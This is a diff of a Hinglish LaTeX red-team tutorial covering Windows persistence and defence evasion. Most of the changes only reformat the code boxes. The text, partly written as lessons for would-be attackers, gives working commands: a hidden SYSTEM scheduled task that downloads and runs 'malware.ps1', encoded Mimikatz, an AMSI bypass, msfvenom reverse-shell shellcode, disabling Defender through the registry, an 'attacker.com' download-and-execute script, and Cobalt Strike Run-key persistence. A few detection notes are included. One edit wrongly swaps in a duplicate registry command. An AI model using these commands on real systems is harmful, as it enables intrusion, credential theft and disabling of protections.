         \item Basic Example: Ek task banao jo har subah 8 AM par Notepad open kare – yeh legit ho sakta hai reminders ke liye.
@@ -2200,17 +2291,24 @@ $instance = Get-WmiObject ...; $instance.Delete()
       \begin{codebox}
         schtasks /create /sc onlogon /tn "ajay" /tr "c:/windows/system32/notepad.exe"
       \end{codebox}
-    \item \textbf{Note:}\color{notered} Note: \color{black} schtasks /create /tn "task name" /tr "c:/windows/syswow64/windowspowershell/v1.0/powershell.exe -windowstyle hidden -nologo -noninteractive -ep bypass -nop -c IEX (new-object net.webclient).downloadString('http://192.168.235/malware.ps1')" /sc onlogon /ru system
+    \item \textbf{Note:}\color{notered} Note: \color{black} schtasks /create /tn "task name" /tr "c:/windows/syswow64/windowspowershell \\
+    /v1.0/powershell.exe -windowstyle hidden -nologo -noninteractive -ep bypass -nop -c IEX (new-object net.webclient).downloadString('http://192.168.235/malware.ps1')" /sc onlogon /ru system
       \begin{itemize}
         \item Corrected Version: Tune jo diya woh thoda galat hai (sysw064 -> SysWOW64, --nolog -> -NoLogo, --nointerface -> -NonInteractive, --ep -> -ExecutionPolicy, -nop -> -NoProfile, /run system -> /ru system). Yeh command ek task create karta hai jo PowerShell se malicious script download aur run karega logon par, hidden mode mein, execution policy bypass karke, SYSTEM privileges se.
         \item What it does: /tn = name, /tr = complex PowerShell command (hidden window, no logo/interaction, bypass policy, download PS1 from URL aur execute via IEX). /sc onlogon = logon trigger, /ru system = run as SYSTEM (high priv).
         \item How Red Teamer Uses It: Advanced persistence – logon par C2 server se fresh malware pull karta hai. Profit: Dynamic payloads (server se update), hidden execution, SYSTEM access for escalation. When? Jab tu avoid karna chahe static files detection. Profit: Ransomware ya espionage mein, yeh auto-reinfect karta hai.
         \item Small Example: Command run karo – logon par PowerShell silently script download karega. Real threat: URL ko attacker-controlled server se link, jo reverse shell deta hai.
       \end{itemize}
-      \begin{codebox}
-        schtasks /create /tn "task name" /tr "c:/windows/syswow64/windowspowershell/v1.0/powershell.exe -WindowStyle Hidden -NoLogo -NonInteractive -ExecutionPolicy Bypass -NoProfile -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.235/malware.ps1')" /sc onlogon /ru system
-      \end{codebox}
-    \item \textbf{Note:}\color{notered} Note: \color{black} schtasks /create /sc minute /mo 1 /tn "task name" /tr "c:/windows/system32/notepad.exe"
+     \begin{codebox}
+schtasks /create /tn "task name" /tr 
+"c:/windows/syswow64/windowspowershell/v1.0/powershell.exe 
+-WindowStyle Hidden -NoLogo -NonInteractive -ExecutionPolicy Bypass 
+-NoProfile -c IEX (New-Object Net.WebClient).DownloadString(
+'http://192.168.235/malware.ps1')" 
+/sc onlogon /ru system
+\end{codebox}
+    \item \textbf{Note:}\color{notered} Note: \color{black} schtasks /create /sc minute /mo 1 /tn "task name" /tr "c:/windows/system32 \\
+    /notepad.exe"
       \begin{itemize}
         \item What it does: Task create karta hai jo har 1 minute (/sc minute /mo 1) Notepad run karega. /tn aur /tr same jaise upar.
         \item How Red Teamer Uses It: Recurring persistence – every minute check kare C2 ya re-execute malware. Profit: Constant access, even agar ek instance kill ho. When? Long-term spying mein, jaise keylogger refresh.
@@ -2234,8 +2332,17 @@ $instance = Get-WmiObject ...; $instance.Delete()
         \item Hypothesis Bana: "Adversary scheduled tasks use kar raha persistence ke liye" based on unusual processes.
         \item Basic Check: Schtasks se query: \texttt{schtasks /query /fo list /v} – suspicious names/triggers/path dekho (jaise hidden PowerShell).
         \item Via GUI/Tool: Taskschd.msc open karo, tasks browse. Tool: Autoruns (Sysinternals) run karo – "Scheduled Tasks" tab mein anomalies highlight.
-        \item Advanced Hunt: Event Viewer mein check (Event ID 4698 for creation, under Microsoft-Windows-TaskScheduler/Operational). PowerShell: \texttt{Get-ScheduledTask | Where-Object \{\$_.State -eq 'Ready'\}}. EDR jaise Sysmon (Event ID 1 for process creation from tasks).
-        \item Validation: Suspicious mile (e.g., /ru SYSTEM with weird URL), file hash VirusTotal par check.
+       \begin{itemize}
+  \item Advanced Hunt: Event Viewer mein check 
+  (Event ID 4698 for creation, under 
+  Microsoft-Windows-TaskScheduler/Operational).\\
+  PowerShell: \texttt{Get-ScheduledTask | Where-Object \{\$_.State -eq 'Ready'\}}.\\
+  EDR jaise Sysmon (Event ID 1 for process creation from tasks).
+
+  \item Validation: Suspicious mile 
+  (e.g., \texttt{/ru SYSTEM} with weird URL), 
+  file hash VirusTotal par check.
+\end{itemize}
         \item Mitigation: Delete: \texttt{schtasks /delete /tn "suspicious" /f}. Prevent: Group Policy se restrict schtasks access, monitor logs with Sigma rules.
         \item Advanced Response: Forensics: Volatility se memory dump analyze, ya timeline with Plaso for task creation time.
       \end{enumerate}
@@ -2305,8 +2412,15 @@ $instance = Get-WmiObject ...; $instance.Delete()
       \begin{enumerate}
         \item Hypothesis Bana: "Adversary services use kar raha persistence ke liye" based on unusual processes ya high CPU.
         \item Basic Check: \texttt{sc query state= all} se all services list karo – suspicious names/binpaths dekho (jaise unknown exe).
-        \item Via Tool: Services.msc open karo ya PowerShell: \texttt{Get-Service | Where-Object \{\$_.StartType -eq 'Automatic'\}} – anomalies check.
-        \item Advanced Hunt: Event Viewer mein Event ID 7045 (new service creation) query karo. Sysmon logs (Event ID 1 for process from services.exe). Tool: Autoruns se services tab check.
+       \begin{itemize}
+  \item Via Tool: \texttt{services.msc} open karo ya PowerShell:\\
+  \texttt{Get-Service | Where-Object \{\$_.StartType -eq 'Automatic'\}} – anomalies check.
+
+  \item Advanced Hunt: Event Viewer mein \textbf{Event ID 7045} 
+  (new service creation) query karo.\\
+  Sysmon logs: \textbf{Event ID 1} for process creation from \texttt{services.exe}.\\
+  Tool: \texttt{Autoruns} se services tab check karo.
+\end{itemize}
         \item Validation: Suspicious mile (e.g., binpath to weird DLL), hash VirusTotal par scan karo.
         \item Mitigation: \texttt{sc stop <name>} phir \texttt{sc delete <name>}. Prevent: Group Policy se restrict sc.exe access.
         \item Advanced Response: Forensics: Volatility se memory analyze for service artifacts, ya timeline with Plaso for creation time.
@@ -2449,18 +2563,7 @@ $instance = Get-WmiObject ...; $instance.Delete()
   \noindent\rule{\textwidth}{1pt}
   \texttt{=============================================================}
 
-  \documentclass[a4paper,12pt]{article}
-  \usepackage[utf8]{inputenc}
-  \usepackage[T1]{fontenc}
-  \usepackage{geometry}
-  \geometry{a4paper, margin=1in}
-  \usepackage{xcolor}
-  \usepackage{tcolorbox}
-  \tcbuselibrary{listings}
-  \usepackage{enumitem}
-  \usepackage{longtable}
-  \usepackage{booktabs}
-  \usepackage{hyperref}
+
 
   \definecolor{codebg}{RGB}{245,245,245}
   \definecolor{titleblue}{RGB}{0,51,102}
@@ -2853,12 +2956,27 @@ $instance = Get-WmiObject ...; $instance.Delete()
                   \end{itemize}
                 \item Encoding (Base64 ya Similar): Script ko encode karo, runtime mein decode. Bypass: AMSI encoded content ko nahi samajhta.
                   \begin{itemize}
-                    \item Steps: 1. Script ko Base64 encode: [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Invoke-Mimikatz')). 2. Decode aur run: \$encoded = 'SQBuAHYAbwBrAGUALQBNAEkAbQBpAGsAYQB0AHoA'; \& ([ScriptBlock]::Create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\$encoded)))).
+                    \begin{itemize}
+  \item Steps:
+  \begin{enumerate}
+    \item Script ko Base64 encode karo:\\
+    \texttt{[Convert]::ToBase64String([Text.Encoding]::Unicode.
+    \\
+    GetBytes('Invoke-Mimikatz'))}
+
+    \item Decode aur run karo:\\
+    \texttt{\$encoded = 'SQBuAHYAbwBrAGUALQBNAEkAbQBpAGsAYQB0AHoA'}\\
+    \texttt{\& ([ScriptBlock]::Create([Text.Encoding]::Unicode.GetString(}\\
+    \texttt{[Convert]::FromBase64String(\$encoded))))}
+  \end{enumerate}
+\end{itemize}
                     \item Example: Yeh encoded Mimikatz run karega, AMSI scan se pehle decode hota hai.
                   \end{itemize}
                 \item Memory Patching (AMSI.dll Modify): AMSI function ko patch karo taaki scan fail ho (e.g., amsiInitFailed set karo).
                   \begin{itemize}
-                    \item Steps: 1. PowerShell mein reflectively load: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true). 2. Ab scripts run without scan.
+                    \item Steps: 1. PowerShell mein reflectively load: [Ref].Assembly.GetType('System \\
+                    .Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic, \\
+                    Static').SetValue(\$null,\$true). 2. Ab scripts run without scan.
                     \item Example: Yeh AMSI ko disable karta hai current session ke liye, phir Invoke-Mimikatz run karo – bypass.
                   \end{itemize}
                 \item PowerShell Downgrade: PowerShell v2 mein switch karo (AMSI nahi hai).
@@ -2956,15 +3074,23 @@ $instance = Get-WmiObject ...; $instance.Delete()
         \item \textbf{Note:}\color{notered} Note: \color{black} How to Create Shellcode from Msfvenom in Kali Linux (Step-by-Step) Msfvenom (Metasploit tool) shellcode generate karta hai quickly, with payloads like reverse shells. Yeh red teamers ka favorite hai kyunki customizable aur encoded hota hai.
           \begin{enumerate}
             \item Kali Mein Msfvenom Start Karo: Terminal open karo.
-            \item Payload Choose Karo: Example: windows/x64/meterpreter/reverse_tcp (reverse shell).
-            \item Command Run Karo: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=your_kali_ip LPORT=4444 -f python -o shellcode.py (yeh Python format mein output deta hai).
+            \begin{itemize}
+  \item Payload Choose Karo: Example — 
+  \texttt{windows/x64/meterpreter/reverse\_tcp} (reverse shell).
+
+  \item Command Run Karo:\\
+  \texttt{msfvenom -p windows/x64/meterpreter/reverse\_tcp}\\
+  \texttt{LHOST=your\_kali\_ip LPORT=4444 -f python -o shellcode.py}\\
+  (yeh Python format mein output deta hai).
+\end{itemize}
               \begin{itemize}
                 \item LHOST: Tumhara Kali IP (ifconfig se dekho).
                 \item LPORT: Listener port.
                 \item -f python: Hex array for Python.
               \end{itemize}
             \item Output Check Karo: shellcode.py mein array milega, jaise buf = b"\xfc\x48..." – isko loader mein paste karo.
-            \item Listener Set Karo: msfconsole mein: use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST your_ip; set LPORT 4444; exploit.
+            \item Listener Set Karo: msfconsole mein: use multi/handler; set payload windows/x64 \\
+            /meterpreter/reverse\_tcp; set LHOST your\_ip; set LPORT 4444; exploit.
             \item Run Loader: Python script run karo – shell connect hoga msfconsole pe.
             \item Real Red Team Twist: Yeh shellcode process injection mein use karo (pehle discuss kiya) for initial access.
           \end{enumerate}
@@ -2975,17 +3101,7 @@ $instance = Get-WmiObject ...; $instance.Delete()
       \noindent\rule{\textwidth}{1pt}
       \texttt{=============================================================}
 
-      \documentclass[a4paper,12pt]{article}
-      \usepackage[utf8]{inputenc}
-      \usepackage[T1]{fontenc}
-      \usepackage{lmodern}
-      \usepackage{xcolor}
-      \usepackage{tcolorbox}
-      \tcbuselibrary{listings}
-      \usepackage{geometry}
-      \usepackage{enumitem}
-      \geometry{margin=1in}
-
+   
       \definecolor{titleblue}{RGB}{0, 51, 102}
       \definecolor{notered}{RGB}{255, 0, 0}
       \definecolor{codebg}{RGB}{245, 245, 245}
@@ -3013,8 +3129,13 @@ $instance = Get-WmiObject ...; $instance.Delete()
         \item General Steps for Process Injection:
           \begin{itemize}
             \item Target Process Select Karo: High-priv process choose karo (e.g., explorer.exe admin mein). Use Process Explorer (pehle discuss kiya) PID find karne.
-            \item Handle Obtain Karo: OpenProcess API se target ka handle lo (access rights: PROCESS_ALL_ACCESS).
-            \item Memory Allocate Karo: VirtualAllocEx se target mein space banao (RWX permissions: PAGE_EXECUTE_READWRITE).
+            \begin{itemize}
+  \item Handle Obtain Karo: \texttt{OpenProcess} API se target ka handle lo\\
+  (access rights: \texttt{PROCESS\_ALL\_ACCESS}).
+
+  \item Memory Allocate Karo: \texttt{VirtualAllocEx} se target mein space banao\\
+  (RWX permissions: \texttt{PAGE\_EXECUTE\_READWRITE}).
+\end{itemize}
             \item Code Write Karo: WriteProcessMemory se malicious code (shellcode/DLL path) copy karo.
             \item Execute Karo: CreateRemoteThread se code run karwao.
             \item Cleanup: Handles close karo traces avoid karne.
@@ -3164,8 +3285,15 @@ $instance = Get-WmiObject ...; $instance.Delete()
             \item Protocol: TCP ya UDP.
             \item Local Address/Port: Tumhara machine ka IP aur port (e.g., 192.168.1.10:1234).
             \item Remote Address/Port: Dusre side ka IP aur port (e.g., attacker IP:4444 for reverse shell).
-            \item State: Connection status (e.g., ESTABLISHED = connected, LISTENING = waiting, TIME_WAIT = closing).
-            \item Sent/Received Packets/Bytes: Kitna data bheja/gaya (useful for investigating data exfil).
+           \begin{itemize}
+  \item State: Connection status\\
+  (e.g., \texttt{ESTABLISHED} = connected, 
+  \texttt{LISTENING} = waiting, 
+  \texttt{TIME\_WAIT} = closing).
+
+  \item Sent/Received Packets/Bytes:\\
+  Kitna data bheja/gaya (useful for investigating data exfil).
+\end{itemize}
             \item Color Coding: Green = new connection, Red = closed, Yellow = changed state – yeh quick spotting ke liye helpful.[3][4][1]
           \end{itemize}
         \item Other Features: Connections close kar sakte ho, processes kill, ya VirusTotal integration se malware check. Yeh reverse connections investigate karne ke liye ideal hai kyunki real-time update deta hai (every 1 second).[3][1]
@@ -3188,24 +3316,24 @@ $instance = Get-WmiObject ...; $instance.Delete()
           \begin{itemize}
             \item Step 1: Target machine par TCPView download aur run karo (compromised session se).
             \item Step 2: List mein dekh lo – process (e.g., injected notepad.exe), protocol (TCP), local port (random), remote address (tumhara Kali IP:4444), state (ESTABLISHED), aur sent/received bytes (e.g., 500 bytes sent – yeh command traffic show karega).
-            \item Step 3: Agar bytes zyada ho (e.g., data exfil), ya state TIME_WAIT ho (dropping), toh troubleshoot karo – jaise port change ya firewall check.
-            \item Step 4: Red team mein, yeh help karta hai agar shell unstable ho – dekh sakte ho competing connections (e.g., AV trying to phone home), unko close karo. Example: Agar remote port 4444 pe traffic ja raha hai aur bytes increasing, confirm hota hai shell active hai.[4][1][3]
+            \begin{itemize}
+  \item Step 3: Agar bytes zyada ho (e.g., data exfil), 
+  ya state \texttt{TIME\_WAIT} ho (dropping), 
+  toh troubleshoot karo – jaise port change ya firewall check.
+
+  \item Step 4: Red team mein, yeh help karta hai agar shell unstable ho – 
+  dekh sakte ho competing connections 
+  (e.g., AV trying to phone home), unko close karo.\\
+  Example: Agar remote port \texttt{4444} pe traffic ja raha hai 
+  aur bytes increasing, confirm hota hai shell active hai.\textsuperscript{[4][1][3]}
+\end{itemize}
           \end{itemize}
         \item Yeh sab se tujhe TCPView ka use clear ho gaya hoga? Important fields jaise State aur Bytes bohot key hain red teaming mein – state se connection health, bytes se data leak check karo. Practice kar Windows VM mein, network tools ke saath. Next topic bata, ya aur details chahiye? As red team expert, main suggest karta hoon blue teams TCPView ko regular monitoring ke liye use karein suspicious connections pakadne. Stay secure! ��
       \end{enumerate}
 
       \noindent\rule{\textwidth}{0.4pt}
 
-      \documentclass[a4paper,12pt]{article}
-      \usepackage[utf8]{inputenc}
-      \usepackage[T1]{fontenc}
-      \usepackage{lmodern}
-      \usepackage{xcolor}
-      \usepackage{tcolorbox}
-      \tcbuselibrary{listings}
-      \usepackage{geometry}
-      \usepackage{enumitem}
-      \geometry{margin=1in}
+      
 
       \definecolor{titleblue}{RGB}{0, 51, 102}
       \definecolor{notered}{RGB}{255, 0, 0}
@@ -3418,16 +3546,7 @@ $instance = Get-WmiObject ...; $instance.Delete()
 
       \noindent\rule{\textwidth}{0.4pt}
 
-      \documentclass[a4paper,12pt]{article}
-      \usepackage[utf8]{inputenc}
-      \usepackage[T1]{fontenc}
-      \usepackage{geometry}
-      \geometry{a4paper, margin=1in}
-      \usepackage{xcolor}
-      \usepackage{enumitem}
-      \usepackage{tcolorbox}
-      \tcbuselibrary{listings}
-      \usepackage{noto}
+      
 
       \definecolor{codebg}{RGB}{245,245,245}
       \definecolor{codeborder}{RGB}{200,200,200}
@@ -3490,7 +3609,12 @@ $instance = Get-WmiObject ...; $instance.Delete()
 
         \item Net ek legacy Windows command hai jo network aur system resources manage karta hai – jaise net user (users manage), net share (shares), aur net stop (services stop). Yeh sc se simple hai but limited – sirf start/stop hi majorly use hota hai services ke liye. \textcolor{red}{\textbf{Note:}} Red teamers isko prefer karte hain kyunki quick aur less verbose hai.[2][5]
 
-        \item \textcolor{red}{\textbf{Note:}} ``net stop <service_name>'' specified service ko stop karta hai. Yeh SCM ko request bhejta hai graceful stop ke liye. Agar service dependent hai, woh bhi stop ho sakta hai.[5][2]
+     \begin{itemize}
+  \item \textcolor{red}{\textbf{Note:}} 
+  \texttt{net stop <service\_name>} specified service ko stop karta hai.\\
+  Yeh SCM ko request bhejta hai graceful stop ke liye.\\
+  Agar service dependent hai, woh bhi stop ho sakta hai.\textsuperscript{[5][2]}
+\end{itemize}
 
         \item \textcolor{red}{\textbf{Note:}} Quick evasion – Defender stop karke malware run karo. Profit: Instant disable, but temporary (reboot pe on ho jaata hai).[2]
 
@@ -3523,20 +3647,32 @@ $instance = Get-WmiObject ...; $instance.Delete()
         \item Access Denied Ka Issue: Yeh hota hai kyunki:
           \begin{itemize}
             \item \textcolor{red}{\textbf{Note:}} Privilege Mismatch: Service system level (SYSTEM) par run hota hai, agar tu admin ho but UAC on hai, denied milega. Ya vice-versa – agar tu low-priv user ho, access nahi.[2]
-            \item Why?: Windows services protected hote hain, stop karne ke liye SERVICE_STOP right chahiye.
-            \item Fix Karo: Run as Administrator (right-click CMD > Run as admin), ya UAC disable (registry se). Agar denied mile, elevated shell le lo (e.g., psexec).[2]
+            \begin{itemize}
+  \item Why?: Windows services protected hote hain, 
+  stop karne ke liye \texttt{SERVICE\_STOP} right chahiye.
+
+  \item Fix Karo: Run as Administrator 
+  (right-click \texttt{CMD} > Run as admin), 
+  ya UAC disable (registry se).\\
+  Agar denied mile, elevated shell le lo 
+  (e.g., \texttt{psexec}).\textsuperscript{[2]}
+\end{itemize}
           \end{itemize}
 
         \item Step-by-Step: Upar net stop ke steps follow karo, agar denied, CMD ko admin mode mein reopen karo.
 
         \item \textcolor{red}{\textbf{Note:}} Red Team Example: Elevated session mein net stop WinDefend – ab real-time scanning off, malware drop karo bina flag ke.
 
-        \item Registry se Defender ko permanently disable kar sakte ho – yeh evasion ke liye better hai kyunki reboot pe bhi off rahega. Key: HKEY_LOCAL_MACHINE\textbackslash SOFTWARE\textbackslash Policies\textbackslash Microsoft\textbackslash Windows Defender.[3]
+        \begin{itemize}
+  \item Registry se Defender ko permanently disable kar sakte ho – 
+  yeh evasion ke liye better hai kyunki reboot pe bhi off rahega.\\
+  Key: \texttt{HKEY\_LOCAL\_MACHINE\textbackslash{}SOFTWARE\textbackslash{}Policies\textbackslash{}Microsoft\textbackslash{}Windows Defender}\textsuperscript{[3]}
+\end{itemize}
 
         \item \textcolor{red}{\textbf{Note:}} Command:
           \begin{tcolorbox}[codebox]
-            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-          \end{tcolorbox}
+reg add "HKLM\textbackslash{}SOFTWARE\textbackslash{}Policies\textbackslash{}Microsoft\textbackslash{}Windows Defender" /v DisableAntiSpyware /t REG \_DWORD /d 1 /f
+\end{tcolorbox}
           – yeh Defender ko disable karta hai.[3]
 
         \item How It Works: Registry value set karta hai jo policy enforce karta hai – 1 = disable, 0 = enable.
@@ -3551,12 +3687,17 @@ $instance = Get-WmiObject ...; $instance.Delete()
 
         \item \textcolor{red}{\textbf{Note:}} Red Team Example: Script mein yeh add karo taaki Defender off ho, phir further evasion (e.g., AMSI bypass).
 
-        \item Real-time monitoring Defender ka core part hai jo files scan karta hai. Isko disable karne se ongoing protection off hota hai. Key: HKEY_LOCAL_MACHINE\textbackslash SOFTWARE\textbackslash Policies\textbackslash Microsoft\textbackslash Windows Defender\textbackslash Real-Time Protection.[3]
+       \begin{itemize}
+  \item Real-time monitoring Defender ka core part hai jo files scan karta hai.\\
+  Isko disable karne se ongoing protection off hota hai.\\
+  Key: \texttt{HKEY\_LOCAL\_MACHINE\textbackslash{}SOFTWARE\textbackslash{}Policies\textbackslash{}Microsoft\textbackslash{}Windows Defender\ \\
+  textbackslash{}Real-Time Protection}\textsuperscript{[3]}
+\end{itemize}
 
         \item \textcolor{red}{\textbf{Note:}} Command:
-          \begin{tcolorbox}[codebox]
-            reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
-          \end{tcolorbox}
+       \begin{tcolorbox}[codebox]
+reg add "HKLM\textbackslash{}SOFTWARE\textbackslash{}Policies\textbackslash{}Microsoft\textbackslash{}Windows Defender" /v DisableAntiSpyware /t REG\_DWORD /d 1 /f
+\end{tcolorbox}
           – yeh real-time off karta hai.[3]
 
         \item How It Works: Value 1 set karne se monitoring disable, scans nahi hote.
@@ -3790,7 +3931,7 @@ $instance = Get-WmiObject ...; $instance.Delete()
 
       \end{enumerate}
 
-      \section*{\color{topicblue}\textbf{Topic---DISM for Disabling Windows Defender}}
+       \section*{\color{topicblue}\textbf{Topic---DISM for Disabling Windows Defender}}
       \begin{enumerate}[leftmargin=*]
         \item DISM (Deployment Image Servicing and Management) ek powerful built-in command-line tool hai jo Windows mein hota hai, aur OS images (jaise .wim files) ko manage, repair, aur customize karne ke liye bana hai. Yeh Windows 7 se available hai, aur admins use karte hain system features ko enable/disable karne, drivers add karne, updates apply karne, ya corrupted images ko fix karne. Basically, yeh Windows ke core components ko handle karta hai bina full reinstall kiye – jaise mechanic car ke parts ko repair karta hai bina puri car badle.[2][3][5][1]
 
@@ -3867,8 +4008,13 @@ $instance = Get-WmiObject ...; $instance.Delete()
                   \begin{tcolorbox}[codebox]
                     sc query WinDefend
                   \end{tcolorbox}
-                  – agar ``SERVICE_NAME: WinDefend'' nahi mile ya stopped ho, success.
-                \item Test karo: EICAR test virus file banao – agar scan nahi hota, disabled hai.[4]
+                  \begin{itemize}
+  \item Agar \texttt{SERVICE\_NAME: WinDefend} nahi mile 
+  ya service stopped ho, toh Defender disable ho chuka hai — success.
+
+  \item Test karo: EICAR test virus file banao.\\
+  Agar scan nahi hota, toh Defender real-time protection disabled hai.\textsuperscript{[4]}
+\end{itemize}
               \end{itemize}
             \item Re-Enable Karne Ke Liye (If Needed):
               \begin{tcolorbox}[codebox]
@@ -3884,16 +4030,7 @@ $instance = Get-WmiObject ...; $instance.Delete()
       \noindent\rule{\textwidth}{0.4pt}
       \texttt{=============================================================}
 
-      \documentclass[a4paper,12pt]{article}
-      \usepackage[utf8]{inputenc}
-      \usepackage[T1]{fontenc}
-      \usepackage{geometry}
-      \geometry{a4paper, margin=1in}
-      \usepackage{xcolor}
-      \usepackage{enumitem}
-      \usepackage{tcolorbox}
-      \tcbuselibrary{listings}
-      \usepackage{noto}
+     
 
       \definecolor{codebg}{RGB}{245,245,245}
       \definecolor{codeborder}{RGB}{200,200,200}
@@ -3972,8 +4109,9 @@ $instance = Get-WmiObject ...; $instance.Delete()
               \end{tcolorbox}
             \item Command:
               \begin{tcolorbox}[codebox]
-                ./teamserver <your_Kali_IP> <password> [optional_malleable_profile] [kill_date]
-              \end{tcolorbox}
+                \begin{tcolorbox}[codebox]
+./teamserver <your\_Kali\_IP> <password> [optional\_malleable\_profile] [kill\_date]
+\end{tcolorbox}
               – e.g.,
               \begin{tcolorbox}[codebox]
                 ./teamserver 192.168.1.100 mypass
@@ -4053,7 +4191,8 @@ $instance = Get-WmiObject ...; $instance.Delete()
 
         \item Why Best (Advantages):
           \begin{itemize}
-            \item \textcolor{red}{\textbf{Note:}} Native aur Trusted: Windows ka built-in tool hai (C:\textbackslash Windows\textbackslash System32\textbackslash bitsadmin.exe), signed by Microsoft – AV/EDR isko suspicious nahi maante (jaise third-party tools ko karte hain). Yeh LOLBin (Living Off the Land Binary) hai, jo evasion ke liye perfect.
+            \item \textcolor{red}{\textbf{Note:}} Native aur Trusted: Windows ka built-in tool hai (C:\textbackslash Windows\textbackslash System32 \\
+            \textbackslash bitsadmin.exe), signed by Microsoft – AV/EDR isko suspicious nahi maante (jaise third-party tools ko karte hain). Yeh LOLBin (Living Off the Land Binary) hai, jo evasion ke liye perfect.
             \item \textcolor{red}{\textbf{Note:}} Asynchronous aur Resilient: Download background mein hota hai, network drop hone pe auto-resume karta hai (e.g., victim offline jaaye phir online aaye, download continue). Other methods (jaise wget) interrupt hone pe fail ho jaate hain.
             \item \textcolor{red}{\textbf{Note:}} Bandwidth Optimization: Idle bandwidth use karta hai, taaki high traffic na dikhe – detection tools (e.g., network monitors) notice nahi karte.
             \item \textcolor{red}{\textbf{Note:}} No Extra Dependencies: No need to install anything, unlike curl ya other downloaders.
@@ -4147,7 +4286,12 @@ $instance = Get-WmiObject ...; $instance.Delete()
       \begin{enumerate}[leftmargin=*]
         \item Time stomping ek anti-forensic technique hai jahaan attacker files ke timestamps (Modified, Accessed, Changed, aur sometimes Birth – MACE) ko intentionally badal deta hai taaki woh files purani ya normal dikhein. Yeh NTFS file system (Windows mein common) par kaam karta hai, jahaan har file ke metadata mein timestamps store hote hain. Simple words mein: Jaise kisi crime scene pe time ko rewind kar do taaki police confuse ho jaaye – yahan files ko ``older time'' dekar unko blend kar do system ke legit files ke saath.[2][3][1]
 
-        \item What It Contains/How It Works: Timestamps NTFS ke \$MFT (Master File Table) mein store hote hain – \$STANDARD_INFORMATION (SI) aur \$FILE_NAME (FN) attributes mein. Attacker inko modify karta hai taaki:
+        \begin{itemize}
+  \item What It Contains/How It Works: 
+  Timestamps NTFS ke \texttt{\$MFT} (Master File Table) mein store hote hain –\\
+  \texttt{\$STANDARD\_INFORMATION} (SI) aur \texttt{\$FILE\_NAME} (FN) attributes mein.\\
+  Attacker inko modify karta hai taaki:
+\end{itemize}
           \begin{itemize}
             \item Modified (M): Last write time.
             \item Accessed (A): Last read time.
@@ -4268,15 +4412,15 @@ $instance = Get-WmiObject ...; $instance.Delete()
               – current user check karo.
             \item Script Craft Karo: Malicious script banao – example: Remote payload download aur execute.
               \begin{tcolorbox}[codebox]
-                # Benign: System info
-                Get-ComputerInfo | Select WindowsProductName, OsName
+# Benign: System info
+Get-ComputerInfo | Select WindowsProductName, OsName
 
-                # Malicious Twist: Download aur run payload (real red team mein)
-                $url = 'http://attacker.com/payload.ps1'  # Yeh reverse shell script ho sakta hai
-                Invoke-WebRequest -Uri $url -OutFile 'temp.ps1'  # Download
-                . .\temp.ps1  # Execute (dot sourcing)
-                Remove-Item temp.ps1  # Cleanup
-              \end{tcolorbox}
+# Malicious Twist: Download aur run payload (real red team mein)
+\$url = 'http://attacker.com/payload.ps1'  # Yeh reverse shell script ho sakta hai
+Invoke-WebRequest -Uri \$url -OutFile 'temp.ps1'  # Download
+. .\textbackslash{}temp.ps1  # Execute (dot sourcing)
+Remove-Item temp.ps1  # Cleanup
+\end{tcolorbox}
             \item Execute Karo: PowerShell mein paste kar run karo – benign mein info milegi; malicious mein payload run hoga (e.g., C2 connect).
             \item Evade Karo: Obfuscate karo – e.g., \$url ko split kar (
                 \begin{tcolorbox}[codebox]
@@ -4293,16 +4437,7 @@ $instance = Get-WmiObject ...; $instance.Delete()
       \noindent\rule{\textwidth}{0.4pt}
       \texttt{=============================================================}
 
-      \documentclass[a4paper,12pt]{article}
-      \usepackage[utf8]{inputenc}
-      \usepackage[T1]{fontenc}
-      \usepackage{geometry}
-      \geometry{a4paper, margin=1in}
-      \usepackage{xcolor}
-      \usepackage{enumitem}
-      \usepackage{tcolorbox}
-      \tcbuselibrary{listings}
-      \usepackage{noto}
+     
 
       \definecolor{codebg}{RGB}{245,245,245}
       \definecolor{codeborder}{RGB}{200,200,200}
@@ -4329,9 +4464,22 @@ $instance = Get-WmiObject ...; $instance.Delete()
 
       \section*{\color{topicblue}\textbf{Topic---Adding a Cobalt Strike Payload in the Run Key Registry}}
       \begin{enumerate}[leftmargin=*]
-        \item Yeh tactic mein, tu Cobalt Strike ke payload (e.g., beacon.exe ya DLL) ko Windows registry ke Run keys mein add karta hai taaki woh user login ya system boot par automatically execute ho jaaye. Run keys registry locations hain (HKEY_CURRENT_USER ya HKEY_LOCAL_MACHINE) jahaan Windows startup programs list karta hai – jaise antivirus ya updates. Cobalt Strike payload add karne se, tu persistence achieve karta hai: System reboot hone pe bhi beacon (C2 agent) run hota rahega, attacker ko continuous access milega.[2][4][6][1]
+        \begin{itemize}
+  \item Yeh tactic mein, tu Cobalt Strike ke payload 
+  (e.g., \texttt{beacon.exe} ya DLL) ko Windows registry ke Run keys mein add karta hai\\
+  taaki woh user login ya system boot par automatically execute ho jaaye.
 
-        \item What It Contains/How It Works: Registry Run keys (e.g., HKCU\textbackslash Software\textbackslash Microsoft\textbackslash Windows\textbackslash CurrentVersion\textbackslash Run) string values store karte hain jo executables ke paths point karte hain. Jab user logs in, Windows inko load karta hai. Cobalt Strike mein, tu beacon payload generate karta hai, usko target pe place karta hai, phir registry mein entry daal deta hai taaki auto-start ho. Yeh user-level (HKCU – current user) ya system-level (HKLM – all users) ho sakta hai.[4][1][2]
+  Run keys registry locations hain 
+  (\texttt{HKEY\_CURRENT\_USER} ya \texttt{HKEY\_LOCAL\_MACHINE})\\
+  jahaan Windows startup programs list karta hai – jaise antivirus ya updates.
+
+  Cobalt Strike payload add karne se, tu persistence achieve karta hai:\\
+  System reboot hone pe bhi beacon (C2 agent) run hota rahega, 
+  attacker ko continuous access milega.\textsuperscript{[2][4][6][1]}
+\end{itemize}
+
+        \item What It Contains/How It Works: Registry Run keys (e.g., HKCU\textbackslash Software\textbackslash Microsoft \\
